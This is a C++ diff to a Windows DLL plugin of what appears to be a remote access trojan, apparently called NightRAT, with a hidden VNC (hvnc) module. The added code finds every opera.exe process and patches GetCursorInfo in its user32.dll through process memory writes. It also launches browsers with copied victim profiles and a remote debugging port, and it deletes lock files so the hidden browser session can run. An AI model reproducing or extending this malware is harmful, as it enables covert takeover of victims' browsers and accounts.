@@ -1731,6 +1731,113 @@ static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir
     return true;
 }
 
+static ULONG_PTR GetModuleBaseAddress(DWORD dwProcID, const wstring& szModuleName) {
+    ULONG_PTR dwModuleBaseAddress = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwProcID);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32W ModuleEntry32;
+        ModuleEntry32.dwSize = sizeof(MODULEENTRY32W);
+        if (Module32FirstW(hSnapshot, &ModuleEntry32)) {
+            do {
+                if (_wcsicmp(ModuleEntry32.szModule, szModuleName.c_str()) == 0) {
+                    dwModuleBaseAddress = (ULONG_PTR)ModuleEntry32.modBaseAddr;
+                    break;
+                }
+            } while (Module32NextW(hSnapshot, &ModuleEntry32));
+        }
+        CloseHandle(hSnapshot);
+    }
+    return dwModuleBaseAddress;
+}
+
+static bool IsProcess32Bit(HANDLE hProcess) {
+    BOOL bIsWow64 = FALSE;
+    typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
+    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
+        GetModuleHandleA("kernel32"), "IsWow64Process");
+    if (fnIsWow64Process != NULL) {
+        if (fnIsWow64Process(hProcess, &bIsWow64)) {
+            if (bIsWow64) {
+                return true;
+            }
+        }
+    }
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
+        return true;
+    }
+    return false;
+}
+
+static bool PatchCursorInfo(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+
+    bool is32 = IsProcess32Bit(hProcess);
+
+    HMODULE hLocalUser32 = GetModuleHandleW(L"user32.dll");
+    if (!hLocalUser32) {
+        CloseHandle(hProcess);
+        return false;
+    }
+    ULONG_PTR localAddr = (ULONG_PTR)GetProcAddress(hLocalUser32, "GetCursorInfo");
+    if (!localAddr) {
+        CloseHandle(hProcess);
+        return false;
+    }
+    ULONG_PTR localOffset = localAddr - (ULONG_PTR)hLocalUser32;
+
+    ULONG_PTR targetUser32Base = GetModuleBaseAddress(pid, L"user32.dll");
+    if (targetUser32Base == 0) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    ULONG_PTR targetAddr = targetUser32Base + localOffset;
+
+    vector<unsigned char> patch;
+    if (is32) {
+        patch = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00 };
+    } else {
+        patch = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
+    }
+
+    DWORD oldProtect = 0;
+    if (VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        SIZE_T written = 0;
+        bool ok = WriteProcessMemory(hProcess, (LPVOID)targetAddr, patch.data(), patch.size(), &written);
+        VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), oldProtect, &oldProtect);
+        CloseHandle(hProcess);
+        return ok && written == patch.size();
+    }
+
+    CloseHandle(hProcess);
+    return false;
+}
+
+static atomic_bool g_patcherRunning(false);
+static thread g_patcherThread;
+
+static void patch_all_opera_processes_async_worker() {
+    while (g_patcherRunning) {
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe32{};
+            pe32.dwSize = sizeof(pe32);
+            if (Process32FirstW(hSnap, &pe32)) {
+                do {
+                    if (_wcsicmp(pe32.szExeFile, L"opera.exe") == 0) {
+                        PatchCursorInfo(pe32.th32ProcessID);
+                    }
+                } while (Process32NextW(hSnap, &pe32));
+            }
+            CloseHandle(hSnap);
+        }
+        this_thread::sleep_for(chrono::milliseconds(1500));
+    }
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1768,11 +1875,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_inputThread.joinable()) g_inputThread.join();
                 g_inputThread = thread(input_loop);
             }
+            if (!g_patcherRunning.exchange(true)) {
+                if (g_patcherThread.joinable()) g_patcherThread.join();
+                g_patcherThread = thread(patch_all_opera_processes_async_worker);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
             g_inputRunning   = false;
+            g_patcherRunning = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
             g_inputCV.notify_all();
@@ -1780,6 +1892,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+            if (g_patcherThread.joinable()) g_patcherThread.join();
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -1914,7 +2027,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         return;
                     }
 
-                    wstring profilePath;
+                    wchar_t tempPath[MAX_PATH];
+                    GetTempPathW(MAX_PATH, tempPath);
+                    wstring tempProfileRoot = tempPath;
+                    tempProfileRoot += L"NightRAT_";
+                    if (wRequestedPath == L"Opera GX") {
+                        tempProfileRoot += L"operagx";
+                    } else {
+                        tempProfileRoot += exeName;
+                    }
+                    tempProfileRoot += L"_Profile";
+
+                    wstring profilePath = tempProfileRoot;
                     wstring profileDir = L"Default";
 
                     if (copyProfile) {
@@ -1929,17 +2053,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             send_error("User Data directory not found.");
                             return;
                         }
-
-                        wchar_t tempPath[MAX_PATH];
-                        GetTempPathW(MAX_PATH, tempPath);
-                        wstring tempProfileRoot = tempPath;
-                        tempProfileRoot += L"NightRAT_";
-                        if (wRequestedPath == L"Opera GX") {
-                            tempProfileRoot += L"operagx";
-                        } else {
-                            tempProfileRoot += exeName;
-                        }
-                        tempProfileRoot += L"_Profile";
 
                         // Mevcut kopya varsa temizle
                         try {
@@ -1989,6 +2102,31 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             }
                             profilePath = tempProfileRoot;
                         }
+                    } else {
+                        try {
+                            fs::create_directories(profilePath);
+                        } catch (...) {}
+                    }
+
+                    // Unconditionally delete lock files before launch
+                    if (!profilePath.empty()) {
+                        vector<wstring> lockFiles = {
+                            L"SingletonLock", L"SingletonSocket", L"SingletonCookie",
+                            L"parent.lock", L"lock", L"Parent.lock"
+                        };
+                        for (const auto& lf : lockFiles) {
+                            try {
+                                fs::remove(fs::path(profilePath) / lf);
+                            } catch (...) {}
+                            try {
+                                fs::remove(fs::path(profilePath) / L"Default" / lf);
+                            } catch (...) {}
+                            if (profileDir != L"Default") {
+                                try {
+                                    fs::remove(fs::path(profilePath) / profileDir / lf);
+                                } catch (...) {}
+                            }
+                        }
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
@@ -1996,12 +2134,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote";
-                        if (copyProfile) {
+                        if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else {
                         args = L" --remote-debugging-port=9222";
-                        if (copyProfile) {
+                        if (!profilePath.empty()) {
                             args += L" --user-data-dir=\"" + profilePath + L"\"";
                             args += L" --profile-directory=\"" + profileDir + L"\"";
                         }
@@ -2123,6 +2261,7 @@ BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
         g_encodeRunning  = false;
         g_sendRunning    = false;
         g_inputRunning   = false;
+        g_patcherRunning = false;
         g_frameCV.notify_all();
         g_sendCV.notify_all();
         g_inputCV.notify_all();
